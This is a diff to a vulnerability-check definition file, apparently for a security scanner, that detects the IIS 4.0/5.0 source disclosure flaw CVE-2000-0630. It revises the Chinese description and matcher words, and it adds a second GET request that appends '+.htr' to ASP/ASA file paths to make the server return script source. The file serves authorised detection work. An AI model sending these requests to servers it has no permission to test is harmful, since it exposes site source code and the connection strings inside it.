@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "检测 Microsoft IIS 4.0 及 5.0 源代码片段泄露漏洞（CVE-2000-0630）。通过在已知 ASP/ASA 文件 URL 后附加 +.htr 后缀，ISM.DLL 会处理请求并返回脚本文件的部分或全部源代码，导致敏感信息泄露。"
+author = "ave"
+description = "通过向 IIS 服务器 URL 追加 '+.htr' 后缀，触发 .htr ISAPI 筛选器以纯文本方式返回 ASP/ASA 文件源代码，检测源代码片段泄露漏洞（CVE-2000-0630）。攻击者可借此获取数据库连接字符串、业务逻辑等敏感信息。"
 id = "POC-AVE-2000-0484"
-name = "Microsoft IIS 4.0/5.0 Source Fragment Disclosure PoC"
+name = "Microsoft IIS 4.0/5.0 源代码片段泄露漏洞 PoC"
 severity = "medium"
 tags = ["ave-2000-0484"]
 vuln_id = [
@@ -15,7 +15,7 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/global.asa+.htr"
+path = "/{{BaseURL}}/iisstart.asp+.htr"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -23,9 +23,10 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "<%",
-    "Language=",
-    "ScriptingHost",
+    "<SCRIPT",
+    "RUNAT",
+    "SERVER",
+    "Object",
 ]
 
 [[poc.requests]]
@@ -38,7 +39,24 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "<%",
-    "Language=",
-    "ScriptingHost",
+    "<SCRIPT",
+    "RUNAT",
+    "SERVER",
+    "Object",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/global.asa+.htr"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<SCRIPT",
+    "RUNAT",
+    "SERVER",
+    "Object",
 ]
